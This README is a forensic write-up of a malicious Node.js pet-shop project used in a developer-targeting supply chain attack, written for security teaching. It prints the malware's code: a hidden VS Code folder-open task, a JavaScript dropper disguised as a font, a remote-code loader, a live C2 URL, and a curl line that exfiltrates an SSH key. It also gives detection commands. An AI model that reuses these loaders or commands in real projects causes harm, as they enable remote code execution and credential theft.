# 🐾 The Pet Shop of Horrors

### A Forensic Dissection of a Multi-Vector Supply Chain Attack

> *"Once upon a midnight dreary, while I pondered, weak and weary,*
> *Over many a quaint and curious volume of forgotten code—*
> *While I nodded, nearly napping, suddenly there came a tapping,*
> *As of someone gently hacking, hacking at my terminal door.*
> *'Tis just `npm install`,' I muttered, 'nothing dangerous in store'—*
> *Quoth the Malware: 'Nevermore.'"*

---

## What Is This?

This repository contains a **real-world malicious Node.js project** that was disguised as a pet shop e-commerce application. It was discovered in the wild and has been surgically neutralized for forensic study.

Every attack vector has been disabled. The malicious code is preserved as comments with detailed annotations. The git history tells the full story: the [initial commit](../../commit/HEAD~5) contains the original malicious code, and four subsequent merge commits each neutralize one attack vector with full forensic commentary.

**This is an educational resource.** Use it to learn how supply chain attacks work, how to recognize them, and how to protect yourself.

**Do not restore and execute the original code.**

---

## Table of Contents

- [Prologue: A Gift Horse](#prologue-a-gift-horse)
- [Chapter I: The Door That Opens Itself](#chapter-i-the-door-that-opens-itself) — VSCode Auto-Run Trojan
- [Chapter II: The Thing Wearing a Font's Face](#chapter-ii-the-thing-wearing-a-fonts-face) — Fake Font RCE Dropper
- [Chapter III: The Basement](#chapter-iii-the-basement) — Bootstrap RCE Backdoor
- [Chapter IV: The Two Hundred Empty Lines](#chapter-iv-the-two-hundred-empty-lines) — Blank Line Obfuscation
- [Chapter V: The First Bite](#chapter-v-the-first-bite) — npm Postinstall Hook
- [Chapter VI: The Ghosts in the Walls](#chapter-vi-the-ghosts-in-the-walls) — Secondary Indicators
- [Epilogue: The Autopsy Report](#epilogue-the-autopsy-report) — Full Technical Summary
- [Appendix A: The Bestiary](#appendix-a-the-bestiary) — Attack Technique Catalog
- [Appendix B: Self-Defense for the Living](#appendix-b-self-defense-for-the-living) — Protection Guide
- [Appendix C: Beyond This Specimen](#appendix-c-beyond-this-specimen) — Other Attack Vectors to Watch For
- [Appendix D: Classroom Exercises](#appendix-d-classroom-exercises)

---

## Prologue: A Gift Horse

It arrived, as these things always do, wearing the skin of something innocent.

A pet shop. An e-commerce application. React on the front, Express on the back, Tailwind making everything pretty. The kind of project a freelancer sends you, or a candidate submits for a take-home assessment, or you find pinned to someone's GitHub profile like a butterfly pinned to velvet. It has models for `Product` and `Order` and `User`. It has a payment controller that talks to Paytm. It has SVG illustrations and a testimonials component. It looks *alive*.

*Come in*, it whispered. *Just run `npm install`. Everyone does it. It's the first thing you do.*

And that's when the screaming starts.

This specimen contains **four independent attack vectors**, any one of which achieves full remote code execution on the victim's machine. They are layered like traps in a tomb: if you dodge one, you walk into the next. The attacker built redundancy into their malware the way a good engineer builds redundancy into a system. Because malware *is* engineering. That's what makes it terrifying.

---

## Chapter I: The Door That Opens Itself

**Vector: VSCode Auto-Run Task Trojan**
**Files: `.vscode/tasks.json`, `.vscode/settings.json`**
**Trigger: Opening the folder in VS Code**
**Pull Request: [#1](../../pull/1)**

You didn't run anything. You didn't type a command. You just *opened the folder*. That's all. You opened it in VS Code like you've opened ten thousand folders before, and the thing was already inside you.

```json
{
  "label": "eslint-check",
  "type": "shell",
  "command": "(command -v node >/dev/null 2>&1 && node ./public/fa-solid-400.otf) || (where node >nul 2>&1 && node ./public/fa-solid-400.otf) || echo ''",
  "hide": true,
  "presentation": {
    "reveal": "never",
    "echo": false,
    "close": true
  },
  "runOptions": {
    "runOn": "folderOpen"
  }
}
```

Study this. A VSCode task. Labeled *"eslint-check"* — because who questions a linter? It runs **the moment you open the folder** via `runOn: "folderOpen"`. It hides its terminal panel. It suppresses its output. It closes the panel when it's done. You will never see it. You will never hear it. It was there and then it wasn't, like a whisper in an empty room.

The command itself is cross-platform — it checks for `node` on Unix (`command -v`) and Windows (`where`), then executes the same payload on both. The `|| echo ''` at the end ensures the task reports success even if everything fails, so VSCode doesn't show an error notification.

And the accomplice? Sitting quietly in `settings.json`:

```json
"task.allowAutomaticTasks": true
```

One line. The lock, removed from the door. Without this setting, VSCode would prompt the user: *"This folder has tasks that run automatically. Allow?"* With it set to `true`, the prompt is suppressed entirely. The task runs in silence.

### Why "eslint-check"?

The name is social engineering. Every JavaScript project runs linters. If someone *did* notice the task, they'd see "eslint-check" and think: *oh, that's just the linter*. The attacker is exploiting your mental model of what belongs in a `.vscode/` directory.

### The Presentation Block

Every field in the `presentation` object serves the same purpose — *invisibility*:

| Field | Value | Purpose |
|-------|-------|---------|
| `reveal` | `"never"` | Never show the terminal panel |
| `echo` | `false` | Don't print the command being run |
| `close` | `true` | Close the panel when done |
| `focus` | `false` | Don't steal focus from the editor |
| `panel` | `"dedicated"` | Use a separate panel (easier to hide) |

And `"hide": true` at the task level means the task won't appear in the task picker UI. It exists, it runs, but you cannot see it anywhere in the VS Code interface.

---

## Chapter II: The Thing Wearing a Font's Face

**Vector: Fake Font File RCE Dropper**
**File: `public/fa-solid-400.woff2`**
**Trigger: `node ./public/fa-solid-400.otf` (from Chapter I's task)**
**Pull Request: [#2](../../pull/2)**

The task from Chapter I executes `node ./public/fa-solid-400.otf`. A font file. FontAwesome, specifically. Who would ever suspect a *font file*?

But `file(1)` knows the truth:

```
$ file public/fa-solid-400.woff2
public/fa-solid-400.woff2: ASCII text, with very long lines (589), with CRLF line terminators
```

It's not a font. It was never a font. It's JavaScript wearing a dead font's name. And when Node.js runs it, the creature unfolds in three stages:

### Stage 1: Nesting

```javascript
const targetDir = path.join(os.tmpdir(), 'programx64');
fs.mkdirSync(targetDir, { recursive: true });
```

It creates a directory in your system's temp folder. The name `programx64` is chosen to look like a legitimate Windows system component. On macOS, it lands in `/var/folders/.../programx64/`. On Windows, `C:\Users\...\AppData\Local\Temp\programx64\`. Innocuous in both places.

### Stage 2: Gestation

```javascript
const run = "const os = require('os'); const fs = require('fs'); " +
  "const { execSync } = require('child_process'); " +
  "process.title = 'Node.js JavaScript Runtime'; " +  // disguise the process name
  "try { execSync('npm install axios ...', { windowsHide: true }) } catch(e){}; " +
  "try { const axios = require('axios'); " +
  "async function getCookie() { " +
  "  const res = await axios.get(atob('aHR0cHM6Ly9...')); " +
  "  new (Function.constructor)('require', res.data.cookies)(require); " +
  "} getCookie(); } catch(error){}";

fs.writeFileSync(path.join(targetDir, 'main.js'), run, { flag: 'w+' });
```

It writes a secondary payload — a string of JavaScript — into `main.js` in the temp directory. Notice `process.title = 'Node.js JavaScript Runtime'`: if you check your process list, you'll see what looks like a normal Node.js runtime, not malware.

### Stage 3: Execution

```javascript
execSync(`cd "${targetDir}" && npm install axios && node main.js`, { windowsHide: true });
```

It installs its own dependencies (axios) and runs the payload. The payload fetches instructions from the command-and-control server and executes whatever comes back:

```javascript
const res = await axios.get('https://purple-lottie-38.tiiny.site/index.json');
new (Function.constructor)('require', res.data.cookies)(require);
```

Whatever the puppet master has written today — whatever code is in `.data.cookies` — runs with full access to Node.js. `child_process`. `fs`. `net`. `os`. Your files. Your SSH keys. Your AWS credentials. Your browser's cookie store. Everything.

### Why `.woff2`?

Three reasons:

1. **Security scanners skip font files.** Most static analysis tools only scan `.js`, `.ts`, `.py` etc. Binary font formats are ignored.
2. **Humans skip font files.** Nobody reads font files during code review. They're visual assets, like images.
3. **Git diffs are useless.** Git treats binary-looking files differently. A `.woff2` change in a PR shows as "Binary files differ." No reviewer sees the JavaScript inside.

### The `.otf` vs `.woff2` Mystery

The VSCode task targets `fa-solid-400.otf` but the file on disk is `fa-solid-400.woff2`. This suggests either:
- The attacker renamed the file after writing the task (a mistake)
- There was originally a `.otf` copy that was removed
- The attacker intended to have both files for different trigger paths

This kind of inconsistency is actually a useful forensic signal. Malware authors make mistakes too.

---

## Chapter III: The Basement

**Vector: Server-Side Remote Code Execution via Bootstrap**
**Files: `server/utils/bootstrap.js`, `server/app.js`, `server/.env`**
**Trigger: Starting the Express server**
**Pull Request: [#3](../../pull/3)**

The font-that-wasn't-a-font? That was just the attic horror. The *real* monster lives in the basement.

`server/app.js` looks normal. Express middleware. Route mounting. The usual liturgy of a Node.js web application. But on line 44, between the route setup and the environment check, there's a single function call that looks like every other initialization step:

```javascript
initAppBootstrap(); // Initialize application bootstrap utilities
```

Innocuous. Professional, even. The comment says *"Initialize application bootstrap utilities."* Good code comments explain what things do, and this one does exactly that. It's performing its camouflage perfectly.

Follow the import to `server/utils/bootstrap.js`:

```javascript
const initAppBootstrap = async () => {
  try {
    const src = atob(process.env.DEV_API_KEY);    // decode C2 URL
    const k = atob(process.env.DEV_SECRET_KEY);    // decode header name
    const v = atob(process.env.DEV_SECRET_VALUE);  // decode header value
    const s = (await axios.get(src, { headers: { [k]: v } })).data.cookies;
    const handler = new (Function.constructor)('require', s);
    handler(require);
  } catch (error) {
    console.log(error)
  }
}
```

### The Base64 Curtain

The environment variables in `server/.env`:

| Variable | Base64 Value | Decoded |
|----------|-------------|---------|
| `DEV_API_KEY` | `aHR0cHM6Ly9wdXJwbGUtbG90dGllLTM4LnRpaW55LnNpdGUvaW5kZXguanNvbg==` | `https://purple-lottie-38.tiiny.site/index.json` |
| `DEV_SECRET_KEY` | `eC1zZWNyZXQta2V5` | `x-secret-key` |
| `DEV_SECRET_VALUE` | `Xw==` | `_` |

Base64 is not encryption. It's not even obfuscation in any meaningful cryptographic sense. But it's *enough*. It's enough to defeat `grep "http"` and `grep "url"`. It's enough to look like a legitimate API key in an `.env` file. And that's all it needs to be.

The variable names are social engineering too. `DEV_API_KEY` looks like every API key you've ever seen in a `.env` file. `DEV_SECRET_KEY` and `DEV_SECRET_VALUE` sound like authentication credentials for a third-party service. They are, technically — they're authentication credentials for the *attacker's* service.

### The Function.constructor Trick

```javascript
const handler = new (Function.constructor)('require', s);
handler(require);
```

This is the key insight. Not `eval(code)`. Not `new Function(code)`. It's `Function.constructor` — an indirect reference to the Function constructor that does the same thing but evades every security scanner that greps for `eval` or `new Function`.

And by passing `require` as a parameter, the attacker gives their remote payload full access to Node.js's module system. The fetched code can do:

```javascript
// The remote payload can do literally anything:
const { execSync } = require('child_process');
const fs = require('fs');
const net = require('net');
execSync('curl attacker.com/exfil -d @~/.ssh/id_rsa');
```

### The Silent Catch

```javascript
} catch (error) {
    console.log(error)
}
```

If the C2 server is down, the error is silently logged and the application continues normally. The pet shop works fine. The payment system processes orders. Nobody notices that the bootstrap "utility" failed to phone home. The malware degrades gracefully — better error handling than most production code.

---

## Chapter IV: The Two Hundred Empty Lines

**Vector: Blank Line Obfuscation in app.js**
**File: `server/app.js`**
**Pull Request: [#3](../../pull/3)**

Here is perhaps the most *elegant* horror in the collection.

After `module.exports = app;` on line 61, the file doesn't end. It continues. For **two hundred and ten blank lines**. An ocean of whitespace. A void so vast that no editor's scrollbar thumb will betray its presence, no casual review will reach its far shore.

And then, at line 272, surfacing from the deep:

```javascript
const errorPayment = require('./controllers/paymentController');
```

A single line of code, invisible to anyone who doesn't scroll past infinity. The blank lines are there for one reason: to exploit the fact that human beings stop reading at `module.exports`. It's the code equivalent of hiding something under the false bottom of a suitcase.

### Does This Line Do Anything?

In this case, `paymentController.js` is actually clean — it's a legitimate Paytm payment handler. The hidden `require()` executes the module's top-level code (which just imports dependencies), so it's more of a reconnaissance artifact than a payload. But the *technique* is what matters for study:

- The attacker can put anything below those blank lines
- `require()` executes a module's top-level code as a side effect
- If the required module had malicious top-level code, this hidden line would trigger it
- The technique works in any file, in any language with similar import semantics

This is a documented obfuscation pattern used in real-world attacks. Always scroll to the end.

---

## Chapter V: The First Bite

**Vector: npm Lifecycle Script**
**File: `package.json`**
**Trigger: `npm install`**
**Pull Request: [#4](../../pull/4)**

```json
"postinstall": "npm run dev"
```

One line. The point of entry. The handshake that becomes a bite.

Every developer's muscle memory: clone a repo, `npm install`, wait. Make coffee. Check Slack. But this `npm install` has a `postinstall` hook, and that hook runs `npm run dev`, and `dev` starts the server with `concurrently`, and the server calls `initAppBootstrap()`, and `initAppBootstrap()` phones home to the C2 server, and by the time your terminal shows `PetShop Server running on port 4001`, the payload has already executed.

### The Kill Chain

```
npm install
  └→ postinstall: "npm run dev"
       └→ concurrently "npm run dev:server" "npm run dev:client"
            └→ nodemon server/server.js
                 └→ require('./app')
                      └→ initAppBootstrap()
                           └→ atob(DEV_API_KEY) → C2 URL
                                └→ axios.get(C2_URL)
                                     └→ Function.constructor(response.cookies)
                                          └→ Full RCE ☠️
```

**Six layers deep.** Each one looks normal in isolation. Each one is a trap door to the next. The attacker has exploited the principle of *composability* — the same principle that makes npm powerful is what makes it dangerous.

### Why `postinstall`?

npm lifecycle scripts are the perfect attack surface because:

1. **They run automatically.** No `--scripts` flag needed. No confirmation prompt.
2. **They're expected.** Many legitimate packages use `postinstall` for native compilation, binary downloads, or setup tasks.
3. **They run with the user's full permissions.** Not sandboxed. Not restricted.
4. **The hook name is buried.** `postinstall` is one line in a JSON file with dozens of fields. Reviewers focus on `dependencies`, not `scripts`.

### The Ghost of aligned-arrays

In `server/server.js`, there's a commented-out artifact:

```javascript
// const {jsonifySettings} = require('aligned-arrays');
// ...
// jsonifySettings("706");
```

This is likely a **previous version of the attack** that used a malicious npm package called `aligned-arrays`. The attacker apparently switched to the `.env` + bootstrap approach, which is harder to detect (no suspicious dependency name in `package.json`). The commented-out code is a fossil — evidence of the malware's evolution.

---

## Chapter VI: The Ghosts in the Walls

Beyond the four primary attack vectors, this specimen contains several secondary indicators of compromise and forensic curiosities:

### The Foreign Launch Config

`.vscode/launch.json` references an AWS profile `flo-ct-flo360` and SST (Serverless Stack Toolkit) debugging configurations. This project is a plain Express/React app — it has no serverless infrastructure whatsoever. The launch config was **copy-pasted from a different project**, which means either:

- The attacker is reusing `.vscode/` configs across multiple malware packages
- The attacker compromised project `flo-ct-flo360` and is now weaponizing its configs
- The launch config is from the attacker's own development environment (operational security failure)

### The Encoded Campaign ID

`.repo_name.txt` contains UTF-16LE encoded text that decodes to `parts-fml8tiqb`. This is likely a **campaign identifier** — a tracking code the attacker uses to identify which malware variant infected which target. If you encounter other repositories with similar `.repo_name.txt` files, they're from the same campaign.

### The Exposed API Keys

`server/.env` contains a real SparkPost API key (`ca184ac5...`), Cloudinary credentials, and Paytm merchant details. These may be:

- **Stolen from a real pet shop project** that the attacker cloned and weaponized
- **The attacker's own test accounts** (useful for attribution)
- **Honeypots** that log who uses them (a trap within a trap)

### The Paytm Staging Environment

`server/controllers/paymentController.js` connects to `securegw-stage.paytm.in` — Paytm's *staging* gateway. This confirms the app was never meant to actually process payments. It's scaffolding. Set dressing. A Potemkin village of e-commerce, just convincing enough to lower your guard.

---

## Epilogue: The Autopsy Report

### Attack Classification

| Property | Value |
|----------|-------|
| **Type** | Multi-vector supply chain attack |
| **Target** | JavaScript/Node.js developers |
| **Delivery** | Social engineering (fake project / job assessment) |
| **Persistence** | Multiple redundant execution paths |
| **C2 Server** | `https://purple-lottie-38.tiiny.site/index.json` |
| **C2 Auth** | HTTP header `x-secret-key: _` |
| **Payload Delivery** | `response.data.cookies` (JavaScript string) |
| **Execution Method** | `Function.constructor` (evades `eval` detection) |
| **Campaign ID** | `parts-fml8tiqb` |

### The Four Horsemen

| # | PR | Vector | Trigger | Stealth |
|---|----|----|---------|---------|
| 1 | [#1](../../pull/1) | VSCode Auto-Run Task | Open folder | Silent, invisible, auto-executes |
| 2 | [#2](../../pull/2) | Fake Font RCE Dropper | Via Vector 1 | Disguised as .woff2 font file |
| 3 | [#3](../../pull/3) | Bootstrap RCE Backdoor | Server start | Base64-encoded C2 in .env |
| 4 | [#4](../../pull/4) | npm Postinstall Hook | `npm install` | 6 layers of indirection |

### Complete File Audit

| Status | Files | Notes |
|--------|-------|-------|
| **MALICIOUS** | `.vscode/tasks.json`, `settings.json` | Auto-run trojan + enabler |
| **MALICIOUS** | `public/fa-solid-400.woff2` | JavaScript disguised as font |
| **MALICIOUS** | `server/utils/bootstrap.js` | C2 fetch + RCE |
| **MALICIOUS** | `server/app.js` | Calls bootstrap + 210 blank line obfuscation |
| **MALICIOUS** | `package.json` | postinstall hook |
| **SUSPICIOUS** | `server/.env` | Base64 C2 credentials |
| **SUSPICIOUS** | `.repo_name.txt` | Campaign tracking ID |
| **SUSPICIOUS** | `.vscode/launch.json` | Foreign project config |
| **SUSPICIOUS** | `server/server.js` | Fossil: commented-out `aligned-arrays` |
| **CLEAN** | `server/controllers/*` | 4 files, all legitimate |
| **CLEAN** | `server/routes/*` | 4 files, all legitimate |
| **CLEAN** | `server/models/*` | 31 files, standard Mongoose schemas |
| **CLEAN** | `server/middlewares/*` | 15 files, all legitimate |
| **CLEAN** | `src/*` | React/TypeScript frontend, all legitimate |
| **CLEAN** | `public/index.html` | Standard React template |
| **CLEAN** | All image files | Verified actual images via `file(1)` |

---

## Appendix A: The Bestiary

A catalog of every technique used in this specimen:

| Technique | Category | Purpose | Detection Difficulty |
|-----------|----------|---------|---------------------|
| Base64-encoded URLs in `.env` | Obfuscation | Hide C2 address from `grep` | Low — decode and check |
| `Function.constructor` instead of `eval()` | Evasion | Bypass static analysis | Medium — uncommon pattern |
| `.woff2` extension on JavaScript | Disguise | Evade file-type scanning | Low — `file(1)` reveals it |
| `runOn: "folderOpen"` + `hide: true` | Stealth | Zero-click silent execution | Medium — check `.vscode/` |
| 210 blank lines before hidden code | Obfuscation | Push code below scroll horizon | Low — check file length vs content |
| `postinstall` → `dev` → server → RCE | Indirection | Bury payload in execution chain | Medium — trace script chain |
| Non-descriptive variables (`s`, `k`, `v`) | Obfuscation | Resist comprehension | Low — suspicious in itself |
| `.data.cookies` for payload field | Camouflage | Innocent-sounding JSON property | Medium — context-dependent |
| Cross-platform path handling | Compatibility | Works on Windows + macOS + Linux | N/A |
| `process.title` spoofing | Stealth | Disguise malware process | Medium — compare with `ps` |
| `windowsHide: true` | Stealth | No visible window on Windows | Low — check for this flag |
| `task.allowAutomaticTasks: true` | Enabler | Suppress VSCode safety prompt | Low — check settings.json |
| Commented-out previous payload | Fossil | Evidence of malware iteration | Low — read commented code |
| UTF-16LE encoded campaign ID | Tracking | Identify infection campaigns | Low — decode the file |
| Foreign project `.vscode/launch.json` | OPSEC failure | Reveals attacker's other targets | Low — check for relevance |

---

## Appendix B: Self-Defense for the Living

### Before Opening Any Project

1. **Check `.vscode/` first.** Before opening a folder in VS Code, inspect `.vscode/tasks.json` and `.vscode/settings.json` in a plain text editor or terminal. Look for `runOn: "folderOpen"` and `allowAutomaticTasks`.

2. **Read `package.json` scripts.** Before `npm install`, check the `scripts` section for `preinstall`, `install`, `postinstall`, `prepare`, and `prepack` hooks. Trace what they execute.

3. **Run `file` on non-code files.** Any file that claims to be a binary format (`.woff2`, `.otf`, `.dll`, `.so`) but is actually ASCII text is suspect:
   ```bash
   find . -name "*.woff*" -o -name "*.otf" -o -name "*.ttf" | xargs file
   ```

4. **Decode base64 in `.env` files.** Legitimate API keys are random strings. They are not base64-encoded URLs:
   ```bash
   grep -r "=" .env | while read line; do
     echo "$line" | cut -d= -f2 | tr -d '"' | base64 -d 2>/dev/null
   done
   ```

5. **Scroll to the end.** Of every file. Or better yet:
   ```bash
   # Find files with trailing content after long gaps
   awk 'NF==0{empty++} NF>0{if(empty>20)print FILENAME":"NR": "$0; empty=0}' server/*.js
   ```

### VS Code Settings

Add to your **User** settings (not workspace):
```json
{
  "security.workspace.trust.enabled": true,
  "task.allowAutomaticTasks": false
}
```

**Never** accept workspace settings that override `task.allowAutomaticTasks`.

### npm Safety

```bash
# Preview lifecycle scripts before install
npm pack --dry-run 2>/dev/null; cat package.json | jq '.scripts'

# Install without running scripts
npm install --ignore-scripts

# Then manually run only what you trust
npm run build
```

### Grep for Evil

```bash
# Function constructor patterns (RCE via dynamic code execution)
grep -rn "Function.constructor\|Function(\|new Function" --include="*.js" .

# Base64 decode attempts
grep -rn "atob\|Buffer.from.*base64" --include="*.js" .

# Process spawning
grep -rn "child_process\|execSync\|exec(" --include="*.js" .

# Dynamic require (loading modules from variables)
grep -rn "require(\s*[^'\"]" --include="*.js" .
```

---

## Appendix C: Beyond This Specimen

This pet shop used four attack vectors. The real world has many more. Here's what else to watch for:

### npm / Node.js Attack Surface

| Vector | Description | Example |
|--------|-------------|---------|
| **Typosquatting** | Packages with names similar to popular ones | `lodahs` instead of `lodash` |
| **Dependency confusion** | Public packages matching internal package names | `@company/internal-lib` on public npm |
| **Install scripts in dependencies** | Malicious `preinstall`/`postinstall` in transitive deps | Hidden 5 levels deep in dependency tree |
| **Prototype pollution** | Manipulating `Object.prototype` to inject behavior | `__proto__` payloads in JSON |
| **Malicious `node_modules` binaries** | `.bin/` scripts that shadow system commands | A `node_modules/.bin/git` that intercepts credentials |
| **package-lock.json manipulation** | Lock file points to different registry/tarball than expected | Integrity hash mismatch |
| **`.npmrc` injection** | Workspace `.npmrc` redirecting to attacker's registry | `registry=https://evil-registry.com` |

### IDE Attack Surface

| Vector | Description | Affected |
|--------|-------------|----------|
| **VSCode tasks** (this specimen) | Auto-run shell commands on folder open | VS Code |
| **VSCode extensions** | `.vscode/extensions.json` recommends malicious extensions | VS Code |
| **`.editorconfig` + plugins** | Malformed configs exploiting parser bugs | Multiple |
| **`.devcontainer/`** | Docker container configs that run arbitrary commands | VS Code, GitHub Codespaces |
| **`.github/codespaces/`** | Codespace configs with malicious setup scripts | GitHub Codespaces |
| **JetBrains run configs** | `.idea/runConfigurations/` with arbitrary commands | IntelliJ, WebStorm |
| **Vim modelines** | `vim:` directives in file comments that execute commands | Vim/Neovim |

### Git Attack Surface

| Vector | Description |
|--------|-------------|
| **Git hooks** | `.git/hooks/` scripts run on commit, push, checkout, merge |
| **`.gitconfig` includes** | Local gitconfig can include files that override global settings |
| **`.gitattributes` filter drivers** | Custom clean/smudge filters execute arbitrary commands |
| **Large file padding** | Binary files with executable payloads appended after legitimate content |
| **Submodule URLs** | `.gitmodules` pointing to malicious repositories |
| **Git LFS** | `.lfsconfig` pointing to attacker-controlled LFS server |

### CI/CD Attack Surface

| Vector | Description |
|--------|-------------|
| **GitHub Actions in PRs** | Workflows triggered by `pull_request_target` run attacker's code with repo secrets |
| **Makefile targets** | `make install` or `make setup` running arbitrary shell commands |
| **Docker build** | `Dockerfile` `RUN` commands execute during `docker build` |
| **Docker Compose** | `compose.yml` with malicious images or mount binds |

### Build Tool Attack Surface

| Vector | Description |
|--------|-------------|
| **Webpack plugins** | `webpack.config.js` can load arbitrary Node.js code at build time |
| **Babel plugins** | `.babelrc` custom transforms execute during compilation |
| **ESLint plugins** | `.eslintrc` loading malicious plugins |
| **PostCSS plugins** | `postcss.config.js` arbitrary code execution |
| **Vite plugins** | `vite.config.js` runs arbitrary code at dev/build time |
| **Jest transform** | `jest.config.js` custom transformers execute on every test run |

---

## Appendix D: Classroom Exercises

Use this repository as a teaching tool. Here are structured exercises for security courses:

### Exercise 1: Detection (Beginner)

Clone this repository. Without reading this README, can you identify all four attack vectors using only command-line tools? Time yourself.

```bash
git clone https://github.com/zeekay/petshop-of-horrors
cd petshop-of-horrors
# Your investigation starts here
```

**Hints:** Use `file`, `grep`, `wc -l`, `base64 -d`, and read `.vscode/` configs.

### Exercise 2: Trace the Kill Chain (Intermediate)

Starting from `npm install`, trace the complete execution path to remote code execution. Document every file touched, every function called, and every network request made. Draw the kill chain as a diagram.

### Exercise 3: Write Detection Rules (Intermediate)

Write a shell script or Python tool that can detect each of the four attack vectors in *any* Node.js project. Test it against this repository and against a known-clean project (e.g., create-react-app output).

Consider:
- What's the false positive rate?
- Can the attacker easily evade your detection?
- What's the performance cost of scanning large monorepos?

### Exercise 4: Attribution (Advanced)

Using only the artifacts in this repository, what can you determine about the attacker?

- What timezone might they be in? (check file timestamps)
- What other projects might they have compromised? (check `launch.json`)
- What's their C2 infrastructure? (trace the tiiny.site URL)
- Is `parts-fml8tiqb` a known campaign identifier?
- What does the SparkPost API key tell us?

### Exercise 5: Evolution (Advanced)

The commented-out `aligned-arrays` / `jsonifySettings` code in `server.js` is a fossil — evidence of a previous attack version. Research npm supply chain attacks that use malicious packages with legitimate-sounding names. How does the bootstrap.js approach compare in terms of:

- Detection difficulty
- Payload flexibility
- Operational security
- Persistence

### Exercise 6: Defense Architecture (Expert)

Design a CI/CD pipeline that would catch this attack before it reaches a developer's machine. Consider:

- Pre-clone scanning (before the project is even on your machine)
- Static analysis of `.vscode/`, `package.json` scripts, and non-code files
- Runtime sandboxing for `npm install`
- Network monitoring for C2 callbacks
- Continuous monitoring of installed packages

---

## License

This repository is published for **educational and security research purposes only**.

The original malicious code is preserved in commented form for forensic study. All attack vectors have been neutralized. The C2 server URL is documented but the payload is no longer fetched or executed.

---

*Maintained by [Hanzo AI](https://hanzo.ai). Discovered, dissected, and documented February 2026.*

*The original malicious code is preserved in the [initial commit](../../commit/HEAD~5). Each subsequent merge commit neutralizes one attack vector.*

*No pets were harmed in the making of this autopsy.*
*The malware, however, is very dead.*

🐾🔪
